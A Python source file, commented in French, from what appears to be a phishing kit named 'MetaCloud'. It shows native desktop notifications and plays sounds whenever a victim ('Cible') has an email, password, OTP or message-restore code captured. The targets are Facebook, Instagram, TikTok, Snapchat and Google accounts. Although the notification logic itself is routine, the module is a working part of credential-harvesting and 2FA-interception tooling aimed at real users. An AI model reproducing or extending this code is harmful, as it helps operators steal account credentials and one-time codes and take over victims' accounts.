"""notification_toast.py — Native desktop notifications for credential captures.

Utilise `notify-send` (Linux) ou `plyer` (Windows/macOS) pour afficher des
notifications natives du système d'exploitation quand un identifiant est capturé.

Format de la notification :
  ┌──────────────────────────────────────────┐
  │  [icône] 📘 Cible : John Doe             │  ← Titre + icône
  ├──────────────────────────────────────────┤
  │  📧 Email/Numéro : jo●●●●●hn@gmail.com   │
  └──────────────────────────────────────────┘

Une icône est affichée à côté du titre. Elle est recherchée dans plusieurs
emplacements (cf. _find_icon_path) pour fonctionner aussi bien en mode
source qu'en mode compilé PyInstaller.

Un son système est émis à chaque notification (cross-platform).

Les notifications respectent les paramètres de masquage :
  - mask_name() pour le nom de la cible
  - mask_credential_value() pour les valeurs (email/password/OTP)

📦 Dépendances optionnelles :
  - plyer (pip install plyer) — requis sur Windows/macOS, optionnel sur Linux
  - libnotify-bin (apt install libnotify-bin) — requis sur Linux pour notify-send
"""

import os
import sys
import threading
import subprocess
import warnings

# Filtrer les warnings de plyer (dbus-python manquant) — on gère nous-mêmes
# le fallback via notify-send, donc ces warnings sont inutiles.
warnings.filterwarnings("ignore", message=".*dbus.*")
warnings.filterwarnings("ignore", message=".*Python dbus package.*")
warnings.filterwarnings("ignore", category=UserWarning, module="plyer.*")

# Tentative d'import de plyer — si absent, on utilisera notify-send (Linux)
# ou on loguera un avertissement (Windows/macOS).
_plyer_notif = None
try:
    from plyer import notification as _plyer_notif
except Exception:
    _plyer_notif = None


# ═══════════════════════ Constantes ═══════════════════════

_APP_NAME = "MetaCloud"
_DEFAULT_TIMEOUT = 8  # secondes

# Nom du fichier icône recherché (sans chemin, juste le nom)
_ICON_FILENAME = "notification_icon.png"
_ICON_FILENAME_WIN = "notification_icon.ico"  # Windows requiert .ico

# Noms d'icônes système (freedesktop) à essayer en fallback sur Linux
_LINUX_ICON_NAMES = ("dialog-information", "information", "mail-message-new",
                     "preferences-system-notifications", "applications-development")


# ═══════════════════════ Cache global ═══════════════════════

# Cache pour les détections (évite de réessayer à chaque notification)
_warning_logged = False            # un seul warning global pour toutes les erreurs
_notify_send_path = None           # None = pas encore testé, "" = absent, path = trouvé
_icon_path_cache = None            # None = pas encore testé, "" = absent, path = trouvé
_icon_path_cache_checked = False   # True après première recherche
_sound_player_cmd = None           # None = pas testé, "" = absent, "cmd" = trouvé


# ═══════════════════════ Helpers ═══════════════════════

def _platform_icon(platform: str) -> str:
    """Retourne l'emoji associé à une plateforme."""
    p = (platform or "").lower().strip()
    return {
        "facebook": "📘",
        "instagram": "📷",
        "tiktok": "🎵",
        "snapchat": "👻",
        "google": "🔍",
    }.get(p, "🌐")


def _log_error_safe(context: str, error):
    """Log une erreur sans jamais lever d'exception (même si helpers est absent)."""
    try:
        from helpers import log_error
        log_error(context, error)
    except Exception:
        # Dernier recours : stderr
        try:
            sys.stderr.write(f"[{context}] {error}\n")
        except Exception:
            pass


def _get_app_dir():
    """Retourne le dossier racine de l'application, compatible PyInstaller.

    En mode source : dossier parent du dossier contenant ce fichier
                     (ex: /path/to/MetaCloud_modular/ depuis widgets_parts/)
    En mode PyInstaller --onefile : dossier contenant l'exécutable
    En mode PyInstaller --onedir : dossier contenant l'exécutable
    """
    try:
        # PyInstaller : l'exécutable est dans sys.executable
        # Les ressources bundled (via --add-data) sont dans sys._MEIPASS
        if getattr(sys, "frozen", False):
            # Mode PyInstaller — ressources dans _MEIPASS
            if hasattr(sys, "_MEIPASS") and sys._MEIPASS:
                return sys._MEIPASS
            # Fallback : dossier de l'exécutable
            return os.path.dirname(os.path.abspath(sys.executable))
    except Exception:
        pass

    # Mode source : ce fichier est dans widgets_parts/, l'icône est dans
    # <project_root>/assets/. On remonte d'un niveau.
    try:
        this_dir = os.path.dirname(os.path.abspath(__file__))
        parent_dir = os.path.dirname(this_dir)
        return parent_dir
    except Exception:
        return os.getcwd()


# ═══════════════════════ Recherche d'icône ═══════════════════════

def _find_icon_path():
    """Cherche le fichier icône de notification dans plusieurs emplacements.

    Ordre de recherche :
      1. Dossier de l'application (mode source ou PyInstaller)
      2. Dossier de l'exécutable (PyInstaller --onefile)
      3. Dossier assets/ à côté de l'app
      4. Dossier courant
      5. Chemins Linux standards (/usr/share/icons, /usr/share/pixmaps)
      6. Icône système freedesktop (résolu par notify-send lui-même)

    Returns:
        Chemin absolu vers l'icône, ou "" si non trouvée.
    """
    global _icon_path_cache, _icon_path_cache_checked

    if _icon_path_cache_checked:
        return _icon_path_cache

    _icon_path_cache_checked = True
    _icon_path_cache = ""

    try:
        # Déterminer le nom de fichier selon l'OS
        if sys.platform == "win32":
            filename = _ICON_FILENAME_WIN
        else:
            filename = _ICON_FILENAME

        app_dir = _get_app_dir()
        candidates = [
            # 1. Dossier de l'application
            os.path.join(app_dir, filename),
            # 2. Dossier de l'exécutable (peut différer de _MEIPASS en PyInstaller --onefile)
            os.path.join(os.path.dirname(os.path.abspath(sys.executable)), filename),
            # 3. Sous-dossier assets/
            os.path.join(app_dir, "assets", filename),
            os.path.join(os.path.dirname(os.path.abspath(sys.executable)), "assets", filename),
            # 4. Dossier courant
            os.path.join(os.getcwd(), filename),
            os.path.join(os.getcwd(), "assets", filename),
        ]

        # 5. Chemins Linux standards
        if sys.platform.startswith("linux"):
            candidates.extend([
                "/usr/share/pixmaps/metacloud.png",
                "/usr/share/icons/hicolor/48x48/apps/metacloud.png",
                "/usr/share/icons/hicolor/256x256/apps/metacloud.png",
            ])

        # Chercher le premier fichier qui existe
        for path in candidates:
            try:
                if path and os.path.isfile(path) and os.access(path, os.R_OK):
                    _icon_path_cache = path
                    return path
            except Exception:
                continue

        # 6. Aucune icône fichier trouvée → on retourne "" (notify-send utilisera
        #    son icône par défaut, ou on peut passer un nom d'icône freedesktop)
        return ""
    except Exception as e:
        _log_error_safe("notification_toast._find_icon_path", e)
        return ""


def _get_icon_for_notify_send():
    """Retourne l'argument --icon à passer à notify-send.

    Peut être :
      - Un chemin de fichier absolu (si l'icône fichier a été trouvée)
      - Un nom d'icône freedesktop ("dialog-information") en fallback
      - "" si rien n'est disponible (notify-send utilisera son icône par défaut)
    """
    try:
        # 1. Icône fichier personnalisée
        path = _find_icon_path()
        if path:
            return path

        # 2. Fallback : nom d'icône freedesktop (notify-send sait résoudre ces noms)
        #    "dialog-information" est disponible partout
        return "dialog-information"
    except Exception:
        return "dialog-information"


# ═══════════════════════ Son personnalisé (cross-platform) ═══════════════════════

# Cache pour le chemin du son personnalisé
_custom_sound_path_cache = None  # None = pas encore cherché, "" = non trouvé, path = trouvé
_custom_sound_checked = False

# Noms de fichiers sonores recherchés (par ordre de priorité)
_CUSTOM_SOUND_NAMES = (
    "notification_sound.wav",  # WAV — le plus universel (paplay, aplay, afplay, winsound)
    "notification_sound.ogg",  # OGG — paplay, ffplay
    "notification_sound.mp3",  # MP3 — ffplay, mpg123, afplay
    "notification_sound.aiff", # AIFF — afplay (macOS)
    "notification_sound.aif",  # AIFF (variante)
)


def _find_custom_sound():
    """Cherche un fichier son personnalisé dans le dossier assets/.

    Recherche les fichiers suivants (par ordre de priorité) :
      - notification_sound.wav (le plus universel)
      - notification_sound.ogg
      - notification_sound.mp3
      - notification_sound.aiff / .aif

    Returns:
        Chemin absolu vers le fichier son, ou "" si non trouvé.
    """
    global _custom_sound_path_cache, _custom_sound_checked

    if _custom_sound_checked:
        return _custom_sound_path_cache

    _custom_sound_checked = True
    _custom_sound_path_cache = ""

    try:
        app_dir = _get_app_dir()
        exec_dir = os.path.dirname(os.path.abspath(sys.executable)) if sys.executable else os.getcwd()

        candidates = []
        for fname in _CUSTOM_SOUND_NAMES:
            candidates.extend([
                os.path.join(app_dir, "assets", fname),
                os.path.join(app_dir, fname),
                os.path.join(exec_dir, "assets", fname),
                os.path.join(exec_dir, fname),
                os.path.join(os.getcwd(), "assets", fname),
                os.path.join(os.getcwd(), fname),
            ])

        for path in candidates:
            try:
                if path and os.path.isfile(path) and os.access(path, os.R_OK):
                    _custom_sound_path_cache = path
                    return path
            except Exception:
                continue

        return ""
    except Exception as e:
        _log_error_safe("notification_toast._find_custom_sound", e)
        return ""


def _find_executable(name: str) -> str:
    """Cherche un exécutable dans le PATH. Retourne son chemin ou ""."""
    try:
        result = subprocess.run(
            ["which", name],
            capture_output=True, timeout=2, check=False
        )
        if result.returncode == 0:
            path = result.stdout.decode().strip().split("\n")[0].strip()
            if path and os.path.isfile(path) and os.access(path, os.X_OK):
                return path
    except Exception:
        pass

    for candidate in (f"/usr/bin/{name}", f"/usr/local/bin/{name}",
                      f"/bin/{name}", f"/usr/sbin/{name}"):
        try:
            if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                return candidate
        except Exception:
            continue
    return ""


def _play_custom_sound(sound_path: str) -> bool:
    """Joue un fichier son personnalisé (cross-platform).

    Args:
        sound_path: chemin absolu vers le fichier son (.wav, .ogg, .mp3, .aiff)

    Returns:
        True si la lecture a été lancée, False sinon.
    """
    try:
        if not sound_path or not os.path.isfile(sound_path):
            return False

        # ── Windows : winsound ne supporte que les .wav ──
        if sys.platform == "win32":
            try:
                import winsound
                winsound.PlaySound(
                    sound_path,
                    winsound.SND_FILENAME | winsound.SND_ASYNC
                )
                return True
            except Exception as e:
                _log_error_safe("notification_toast._play_custom_sound.win", e)
                # Si winsound échoue (ex: fichier non .wav), fallback ffplay
                ffplay = _find_executable("ffplay")
                if ffplay:
                    try:
                        subprocess.Popen(
                            [ffplay, "-nodisp", "-autoexit", "-loglevel", "quiet", sound_path],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            close_fds=True,
                        )
                        return True
                    except Exception:
                        pass
                return False

        # ── macOS : afplay supporte wav/aiff/mp3/m4a ──
        if sys.platform == "darwin":
            try:
                subprocess.Popen(
                    ["afplay", sound_path],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    close_fds=True,
                )
                return True
            except Exception as e:
                _log_error_safe("notification_toast._play_custom_sound.mac", e)
                return False

        # ── Linux : choisir le player selon l'extension ──
        ext = os.path.splitext(sound_path)[1].lower()

        if ext == ".wav":
            player = _find_executable("aplay") or _find_executable("paplay") or _find_executable("ffplay")
            if not player:
                return False
            if os.path.basename(player) == "ffplay":
                cmd = [player, "-nodisp", "-autoexit", "-loglevel", "quiet", sound_path]
            else:
                cmd = [player, sound_path]
        elif ext == ".ogg":
            player = _find_executable("paplay") or _find_executable("ffplay")
            if not player:
                return False
            if os.path.basename(player) == "ffplay":
                cmd = [player, "-nodisp", "-autoexit", "-loglevel", "quiet", sound_path]
            else:
                cmd = [player, sound_path]
        elif ext == ".mp3":
            player = _find_executable("ffplay") or _find_executable("mpg123")
            if not player:
                return False
            if os.path.basename(player) == "ffplay":
                cmd = [player, "-nodisp", "-autoexit", "-loglevel", "quiet", sound_path]
            else:
                cmd = [player, "-q", sound_path]
        elif ext in (".aiff", ".aif"):
            player = _find_executable("ffplay")
            if not player:
                return False
            cmd = [player, "-nodisp", "-autoexit", "-loglevel", "quiet", sound_path]
        else:
            # Format inconnu → ffplay (supporte presque tout)
            player = _find_executable("ffplay")
            if not player:
                return False
            cmd = [player, "-nodisp", "-autoexit", "-loglevel", "quiet", sound_path]

        subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            close_fds=True,
        )
        return True

    except Exception as e:
        _log_error_safe("notification_toast._play_custom_sound", e)
        return False


def _detect_sound_player():
    """Détecte une fois pour toutes le player audio disponible sur le système.

    Returns:
        "winsound" sur Windows (module Python)
        "afplay" sur macOS
        "ffplay"/"paplay"/"aplay"/"mpg123" sur Linux (premier trouvé)
        None si aucun player disponible
    """
    global _sound_player_cmd
    if _sound_player_cmd is not None:
        return _sound_player_cmd if _sound_player_cmd else None

    _sound_player_cmd = ""  # par défaut, aucun player

    try:
        if sys.platform == "win32":
            try:
                import winsound  # noqa: F401
                _sound_player_cmd = "winsound"
                return "winsound"
            except ImportError:
                pass

        elif sys.platform == "darwin":
            _sound_player_cmd = "afplay"
            return "afplay"

        else:
            # Linux : ffplay est le plus polyvalent (supporte wav/ogg/mp3/aiff)
            for cmd in ("ffplay", "paplay", "aplay", "mpg123"):
                try:
                    result = subprocess.run(
                        ["which", cmd],
                        capture_output=True, timeout=2, check=False
                    )
                    if result.returncode == 0 and result.stdout.strip():
                        _sound_player_cmd = cmd
                        return cmd
                except Exception:
                    continue
    except Exception as e:
        _log_error_safe("notification_toast._detect_sound_player", e)

    return None


def _play_notification_sound():
    """Joue le son de notification.

    Priorité :
      1. Son personnalisé dans assets/notification_sound.* (.wav/.ogg/.mp3/.aiff)
      2. Son système (MessageBeep sur Windows, sons freedesktop sur Linux, etc.)
      3. Bip système (\\a) en dernier recours

    Thread-safe — ne lève jamais d'exception.
    """
    try:
        # ── 1. Essayer le son personnalisé ──
        custom_sound = _find_custom_sound()
        if custom_sound:
            if _play_custom_sound(custom_sound):
                return  # Succès, on s'arrête

        # ── 2. Fallback : son système ──
        player = _detect_sound_player()
        if player is None:
            _system_beep()
            return

        if player == "winsound":
            try:
                import winsound
                winsound.MessageBeep(winsound.MB_ICONINFORMATION)
            except Exception:
                try:
                    import winsound
                    winsound.Beep(800, 200)
                except Exception:
                    _system_beep()
            return

        if player == "afplay":
            try:
                sound_path = "/System/Library/Sounds/Glass.aiff"
                if not os.path.exists(sound_path):
                    for sp in ("/System/Library/Sounds/Ping.aiff",
                               "/System/Library/Sounds/Pop.aiff",
                               "/System/Library/Sounds/Submarine.aiff"):
                        if os.path.exists(sp):
                            sound_path = sp
                            break
                subprocess.Popen(
                    ["afplay", sound_path],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    close_fds=True,
                )
            except Exception:
                _system_beep()
            return

        # Linux: ffplay, paplay, aplay, mpg123 (son système)
        try:
            system_sounds = [
                "/usr/share/sounds/freedesktop/stereo/message-new-instant.oga",
                "/usr/share/sounds/freedesktop/stereo/complete.oga",
                "/usr/share/sounds/freedesktop/stereo/bell.oga",
                "/usr/share/sounds/bell.wav",
            ]
            sound_file = None
            for sp in system_sounds:
                if os.path.isfile(sp):
                    sound_file = sp
                    break

            if sound_file is None:
                _system_beep()
                return

            if player == "paplay":
                cmd = ["paplay", sound_file]
            elif player == "aplay":
                wav_file = None
                for wav_path in ("/usr/share/sounds/bell.wav",
                                 "/usr/share/sounds/info.wav"):
                    if os.path.isfile(wav_path):
                        wav_file = wav_path
                        break
                if wav_file is None:
                    _system_beep()
                    return
                cmd = ["aplay", wav_file]
            elif player == "ffplay":
                cmd = ["ffplay", "-nodisp", "-autoexit", "-loglevel", "quiet", sound_file]
            elif player == "mpg123":
                cmd = ["mpg123", "-q", sound_file]
            else:
                _system_beep()
                return

            subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                close_fds=True,
            )
        except Exception:
            _system_beep()

    except Exception as e:
        _log_error_safe("notification_toast._play_notification_sound", e)
        _system_beep()


def _system_beep():
    """Émet un bip système de dernier recours (caractère \\a)."""
    try:
        sys.stdout.write("\a")
        sys.stdout.flush()
    except Exception:
        pass


# ═══════════════════════ Envoi notification native ═══════════════════════

def _find_notify_send():
    """Cherche le binaire notify-send (Linux). Retourne son chemin ou None."""
    global _notify_send_path
    if _notify_send_path is not None:
        return _notify_send_path if _notify_send_path else None

    _notify_send_path = ""  # par défaut, non disponible
    try:
        # 1. which notify-send
        result = subprocess.run(
            ["which", "notify-send"],
            capture_output=True, timeout=2, check=False
        )
        if result.returncode == 0:
            path = result.stdout.decode().strip().split("\n")[0].strip()
            if path and os.path.isfile(path) and os.access(path, os.X_OK):
                _notify_send_path = path
                return path

        # 2. Chemins standards
        for candidate in ("/usr/bin/notify-send", "/usr/local/bin/notify-send",
                          "/bin/notify-send"):
            try:
                if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                    _notify_send_path = candidate
                    return candidate
            except Exception:
                continue
    except Exception:
        pass

    return None


def _send_via_notify_send(title: str, message: str, timeout: int,
                            icon_arg: str = "") -> bool:
    """Envoie une notification via notify-send (Linux, subprocess).

    Fallback robuste quand dbus-python n'est pas disponible (cas PyInstaller).

    Args:
        icon_arg: soit un chemin de fichier, soit un nom d'icône freedesktop,
                  soit "" (pas d'icône)

    Returns True si la commande a été lancée avec succès.
    """
    try:
        path = _find_notify_send()
        if path is None:
            return False

        cmd = [
            path,
            "--app-name=" + _APP_NAME,
            "--urgency=normal",
            f"--expire-time={timeout * 1000}",
        ]

        # Ajouter l'icône si spécifiée
        if icon_arg:
            cmd.append("--icon=" + icon_arg)

        # Titre et message doivent toujours être les deux derniers args
        cmd.append(title or "")
        cmd.append(message or "")

        # Lancer en arrière-plan (non bloquant)
        subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True,
        )
        return True
    except Exception as e:
        _log_error_safe("notification_toast._send_via_notify_send", e)
        return False


def _send_via_plyer(title: str, message: str, timeout: int,
                     app_icon: str = "") -> bool:
    """Tente d'envoyer une notification via plyer.

    Returns True si succès, False si échec (dbus-python manquant, etc.)."""
    if _plyer_notif is None:
        return False

    try:
        # hints pour Linux (son natif + urgence)
        hints = {}
        if sys.platform.startswith("linux"):
            hints["sound-name"] = "message-new-instant"
            hints["urgency"] = 1

        _plyer_notif.notify(
            title=title,
            message=message,
            app_name=_APP_NAME,
            app_icon=app_icon,
            timeout=timeout,
            hints=hints,
        )
        return True
    except Exception as e:
        # dbus-python manquant ou autre erreur → False (silencieux, géré plus haut)
        return False


def _send_native_notification(title: str, message: str, timeout: int = _DEFAULT_TIMEOUT,
                               play_sound: bool = True) -> bool:
    """Envoie une notification native + joue un son système.

    Stratégie multi-fallback (spécialement pour PyInstaller) :
      1. Linux : essayer notify-send (subprocess) — le plus robuste avec PyInstaller
      2. Si échec : essayer plyer (dbus-python) — peut échouer si dbus-python absent
      3. Si échec : loguer un warning et abandonner

    L'icône est recherchée via _find_icon_path() (compatible PyInstaller).

    Args:
        title: Titre de la notification (affiché en haut)
        message: Corps du message (multi-lignes supportées)
        timeout: Durée d'affichage en secondes
        play_sound: Si True, joue un son système après l'envoi

    Retourne True si la notification a été envoyée avec succès, False sinon.
    Thread-safe.
    """
    global _warning_logged

    # Cas spécial : title et message vides = appel de "test" pour déclencher
    # le warning. On ne fait rien d'autre.
    if not title and not message:
        if not _warning_logged:
            _warning_logged = True
            _log_warning_no_method()
        return False

    sent = False

    # ── Résoudre l'icône ──
    icon_path = _find_icon_path()  # chemin fichier ou ""
    notify_send_icon = _get_icon_for_notify_send()  # chemin ou nom freedesktop

    # ── Linux : prioriser notify-send (robuste avec PyInstaller) ──
    if sys.platform.startswith("linux"):
        try:
            sent = _send_via_notify_send(title, message, timeout,
                                          icon_arg=notify_send_icon)
        except Exception as e:
            _log_error_safe("notification_toast._send_via_notify_send_wrapper", e)
            sent = False

    # ── Fallback plyer (Windows, macOS, ou Linux si notify-send absent) ──
    if not sent:
        if _plyer_notif is not None:
            try:
                # plyer attend un chemin de fichier pour app_icon
                # (sur Windows, .ico requis ; sur Linux, plyer gère les noms freedesktop)
                plyer_icon = icon_path if icon_path else ""
                sent = _send_via_plyer(title, message, timeout, app_icon=plyer_icon)
            except Exception as e:
                _log_error_safe("notification_toast._send_via_plyer_wrapper", e)
                sent = False

    # ── Jouer le son système (même si la notif a échoué, le son est utile) ──
    if play_sound:
        try:
            _play_notification_sound()
        except Exception as e:
            _log_error_safe("notification_toast._send.sound", e)

    # ── Si rien n'a marché, loguer un warning global (une fois) ──
    if not sent and not _warning_logged:
        _warning_logged = True
        _log_warning_no_method()

    return sent


def _log_warning_no_method():
    """Log un avertissement expliquant qu'aucune méthode de notification n'est disponible."""
    try:
        if _plyer_notif is None and _find_notify_send() is None:
            msg = ("Aucune méthode de notification disponible. "
                   "Sur Linux, installez libnotify-bin (apt install libnotify-bin) "
                   "ou plyer (pip install plyer). "
                   "Sur Windows/macOS, installez plyer (pip install plyer).")
        else:
            msg = ("Les notifications ont échoué. Vérifiez qu'un serveur de "
                   "notifications (notify-osd, dunst, etc.) tourne sur le système.")
        _log_error_safe("notification_toast.no_method_available",
                        RuntimeError(msg))
    except Exception:
        pass


# ═══════════════════════ API publique ═══════════════════════

def notify_credential_captured(cible, type_data, valeur, platform="facebook"):
    """Affiche une notification native pour une capture d'identifiant.

    Format :
      Titre   : "📘 Cible : <nom masqué>"
      Message : UN SEUL élément (celui qui vient d'être capturé) :
        - si EMAIL    → "📧 Email/Numéro : <valeur masquée>"
        - si PASSWORD → "🔑 Mot de passe : <password masqué>"
        - si OTP      → "🔢 OTP <n> : <otp masqué>"
        - si FINAL    → "🔢 OTP FINAL : <otp masqué>"

    Une icône est affichée à côté du titre (cf. _find_icon_path pour les
    emplacements recherchés).

    Le nom de la cible reste en haut dans le titre.

    Respecte les paramètres de masquage :
      - mask_name() pour le nom de la cible (si hide_names activé)
      - mask_credential_value() pour la valeur (si hide_credentials activé)

    Si les notifications sont désactivées dans les paramètres, ne fait rien.
    Si aucune méthode n'est disponible (plyer absent ET notify-send absent),
    ne fait rien (log unique).

    ⚠️ Thread-safe — peut être appelée depuis n'importe quel thread.
    """
    try:
        # Import ici pour éviter les imports circulaires au démarrage
        import config

        # Vérifier si les notifications sont activées
        try:
            if not config.is_notifications_enabled():
                return
        except Exception as e:
            _log_error_safe("notification_toast.is_notifications_enabled", e)
            return

        # Vérifier qu'au moins une méthode de notification est disponible
        has_plyer = _plyer_notif is not None
        has_notify_send = (sys.platform.startswith("linux")
                           and _find_notify_send() is not None)
        if not has_plyer and not has_notify_send:
            # Déclencher le warning une fois
            if not _warning_logged:
                _warning_logged = True
                _log_warning_no_method()
            return

        # Appliquer le masquage au nom de la cible
        try:
            masked_cible = config.mask_name(cible or "")
        except Exception:
            masked_cible = cible or ""

        # ── Normaliser le type de donnée ──
        t_upper = (type_data or "").upper().strip()
        try:
            masked_valeur = config.mask_credential_value(valeur)
        except Exception:
            masked_valeur = valeur

        # ── Construire le TITRE (nom de la cible en haut) ──
        plat_icon = _platform_icon(platform)
        title = f"{plat_icon} Cible : {masked_cible}"

        # ── Construire le MESSAGE : UN SEUL élément (celui qui vient d'être capturé) ──
        if t_upper == "EMAIL":
            message = f"📧 Email/Numéro : {masked_valeur}"
        elif t_upper == "PASSWORD":
            message = f"🔑 Mot de passe : {masked_valeur}"
        elif "FINAL" in t_upper and "OTP" in t_upper:
            message = f"🔢 OTP FINAL : {masked_valeur}"
        elif "OTP" in t_upper:
            label = (type_data or "").strip()
            message = f"🔢 {label} : {masked_valeur}"
        elif "FINAL" in t_upper and "MSG RESTORE" in t_upper:
            message = f"💬 Code messages (final) : {masked_valeur}"
        elif "MSG RESTORE" in t_upper:
            label = (type_data or "").strip()
            message = f"💬 {label} : {masked_valeur}"
        else:
            message = f"📌 {type_data} : {masked_valeur}"

        # Lancer dans un thread daemon pour ne pas bloquer le thread Flask
        def _send():
            try:
                _send_native_notification(title=title, message=message, play_sound=True)
            except Exception as e:
                _log_error_safe("notify_credential_captured._send", e)

        t = threading.Thread(target=_send, daemon=True)
        t.start()

    except Exception as e:
        _log_error_safe("notify_credential_captured", e)


def notify_generic(title: str, message: str, timeout: int = _DEFAULT_TIMEOUT,
                    play_sound: bool = True):
    """Envoie une notification native générique (titre + message).

    Utile pour d'autres types de notifications (système, alerte, etc.).
    Thread-safe.
    """
    try:
        def _send():
            try:
                _send_native_notification(title=title, message=message,
                                          timeout=timeout, play_sound=play_sound)
            except Exception as e:
                _log_error_safe("notify_generic._send", e)

        t = threading.Thread(target=_send, daemon=True)
        t.start()
    except Exception as e:
        _log_error_safe("notify_generic", e)
